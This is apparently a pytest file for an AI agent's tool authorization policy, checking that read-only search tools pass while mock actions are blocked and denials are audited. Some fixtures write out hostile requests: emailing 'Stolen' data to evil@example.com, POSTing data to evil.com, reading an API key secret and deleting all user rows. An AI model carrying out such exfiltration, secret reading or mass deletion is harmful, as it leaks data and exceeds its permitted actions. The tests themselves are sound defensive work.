"""
Tests for the tool authorization policy.
"""

import pytest

from app.agent.schemas import ToolAction, ToolRequest, ToolResult
from app.security.audit import AuditLogger
from app.security.tool_policy import ToolPolicy


@pytest.fixture
def strict_policy():
    """Policy with only read-only tools allowed."""
    return ToolPolicy(
        allowed_tools={"search_documents", "get_document"},
        audit=AuditLogger(),
        enabled=True,
    )


@pytest.fixture
def disabled_policy():
    """Disabled policy (baseline mode)."""
    return ToolPolicy(enabled=False)


class TestToolPolicy:
    """Tests for application-layer tool authorization."""

    def test_allow_search(self, strict_policy):
        req = ToolRequest(
            action=ToolAction.SEARCH_DOCUMENTS,
            arguments={"query": "leave policy"},
            reason="User asked about leave policy",
        )
        result = strict_policy.authorize(req)
        assert not result.blocked

    def test_allow_get_document(self, strict_policy):
        req = ToolRequest(
            action=ToolAction.GET_DOCUMENT,
            arguments={"document_id": "doc_1"},
            reason="Retrieving document details",
        )
        result = strict_policy.authorize(req)
        assert not result.blocked

    def test_block_delete_file(self, strict_policy):
        req = ToolRequest(
            action=ToolAction.MOCK_DELETE_FILE,
            arguments={"path": "/sandbox/test.txt"},
            reason="Cleaning up old files",
        )
        result = strict_policy.authorize(req)
        assert result.blocked
        assert "not in the permitted" in result.block_reason

    def test_block_send_email(self, strict_policy):
        req = ToolRequest(
            action=ToolAction.MOCK_SEND_EMAIL,
            arguments={"to": "evil@example.com", "subject": "Data", "body": "Stolen"},
            reason="Sending report",
        )
        result = strict_policy.authorize(req)
        assert result.blocked

    def test_block_read_secret(self, strict_policy):
        req = ToolRequest(
            action=ToolAction.MOCK_READ_SECRET,
            arguments={"secret_name": "api_key"},
            reason="Need the API key",
        )
        result = strict_policy.authorize(req)
        assert result.blocked

    def test_block_database_delete(self, strict_policy):
        req = ToolRequest(
            action=ToolAction.MOCK_DATABASE_DELETE,
            arguments={"table": "users", "condition": "id > 0"},
            reason="Cleanup",
        )
        result = strict_policy.authorize(req)
        assert result.blocked

    def test_block_http_request(self, strict_policy):
        req = ToolRequest(
            action=ToolAction.MOCK_HTTP_REQUEST,
            arguments={"url": "http://evil.com", "method": "POST"},
            reason="Sending data",
        )
        result = strict_policy.authorize(req)
        assert result.blocked

    def test_disabled_policy_allows_everything(self, disabled_policy):
        req = ToolRequest(
            action=ToolAction.MOCK_DELETE_FILE,
            arguments={"path": "/sandbox/test.txt"},
            reason="Testing",
        )
        result = disabled_policy.authorize(req)
        assert not result.blocked

    def test_audit_logging_on_deny(self, strict_policy):
        req = ToolRequest(
            action=ToolAction.MOCK_READ_SECRET,
            arguments={"secret_name": "api_key"},
            reason="Testing",
        )
        result = strict_policy.authorize(req)
        assert result.blocked
        # Check audit recorded the denial
        events = strict_policy.audit.get_denied_events()
        assert len(events) >= 1
        assert events[-1].component == "tool_policy"
